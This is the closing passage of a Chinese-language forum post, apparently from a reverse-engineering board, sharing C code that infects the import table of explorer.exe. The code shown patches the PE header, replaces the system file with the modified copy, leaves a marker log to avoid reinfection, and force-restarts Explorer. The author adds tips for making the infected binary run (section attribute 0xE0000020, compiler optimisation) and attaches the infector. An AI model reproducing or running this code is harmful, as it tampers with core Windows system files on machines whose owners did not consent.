
```
    fseek(fp,(DWORD)(lpPEhead)-(DWORD)lpBaseAddr,SEEK_SET);  

    //写入更新后的 PE 头  

    fwrite(&NewNThead,sizeof(IMAGE_NT_HEADERS),1,fp);  

    fclose(fp);  

    UnMapAndLoad(&img);  

  }  

  else  

  {  

    ::DeleteFile(NewPath);  

    ::DeleteFile(TemPath);  

    return 0;  

  }  

  //删除临时文件  

  ::DeleteFile(TemPath);  

  //干掉 explorer.exe  

  ::rename(FilePath,TemPath);  

  //让我们修改过后的替换掉 explorer.exe  

  ::rename(NewPath,FilePath);  

  //创建日志文件，以免重复修改  

  fp=::fopen(LogPath,"w");  

  fclose(fp);  

  //重新运行 explorer  

  ::system("taskkill /F /im explorer.exe");  

  ::system("explorer.exe");  

  return 1;  

}
```

以上就是我辛辛苦苦探索的结果了，希望各位不要嫌弃，由于本人编码水平并不是太高，所以考虑不周之处在所难免，若有高人看出，希望不吝赐教。在实现上面功能的过程当中，我也产生了很多的困惑，到如今都还是不太明白，在代码的注释当中我就说了一处，为什么非得把第一节的属性更新为`0xE0000020`，若不这样做，程序就不能正常初始化，刚开始我就忽略了这个地方，导致郁闷了很久，后来与`loadPE`修改过的文件一比较，终于恍然大悟，改后果然顺利运行。还有一个疑惑是与`vc++6.0`的编译器相关的，编译出来的`debug`版本修改过的`explorer.exe`顺利运行，编译出来的`release`版本修改过的`explorer.exe`不能运行，`pe`工具查看发现节的数目不正确，这叫我又郁闷了好一阵，我怀疑是编译器的优化造成的，默认的优化方式是最快速度，我把它改为默认，重新编译源文件后，一切正常。在这点上我提醒各位看客，如果想尝试自己编译上面的代码，请修改优化方式为默认就可以了。好了，以上就是我的成果以及一些困惑，希望大家各取所需，同时在拿的时候也不要忘了想想我提的问题。

### 上传的附件

| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) | | `感染导入表.rar` |
| :--- | :--- | :--- |

| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) | | `还原修改过的文件.rar` |
| :--- | :--- | :--- |
